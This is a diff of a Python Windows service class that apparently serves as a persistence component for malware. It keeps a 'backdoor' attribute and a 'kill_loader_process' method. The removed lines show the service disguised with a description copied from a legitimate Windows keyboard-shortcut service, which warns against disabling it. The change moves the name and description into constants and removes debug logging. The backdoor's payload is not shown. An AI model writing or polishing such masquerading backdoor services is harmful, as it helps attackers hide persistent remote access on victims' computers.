@@ -7,20 +7,14 @@ import psutil
 
 
 class Main(service.WinService):
-    _svc_name_ = "ABC"
-    _svc_display_name_ = "ABC"
-    _svc_description_ = "Enables and supports the use of keyboard shortcuts on keyboards, remote controls, and other " \
-                        "multimedia devices. Disabling this service is not recommended."
+    _svc_name_ = SERVICE_NAME
+    _svc_display_name_ = SERVICE_NAME
+    _svc_description_ = SERVICE_DESCRIPTION
 
     def __init__(self, args):
         super().__init__(args)
         self.is_running = False
-        self.service_log_filepath = r"C:\Users\User\Desktop\service_log.txt"
         self.backdoor = None
-
-    def log(self, log_message):
-        with open(self.service_log_filepath, "a") as f:
-            f.write(log_message + "\n")
 
     @staticmethod
     def kill_loader_process():
@@ -47,4 +41,3 @@ if __name__ == '__main__':
         servicemanager.StartServiceCtrlDispatcher()
     else:
         Main.parse_command_line()
-
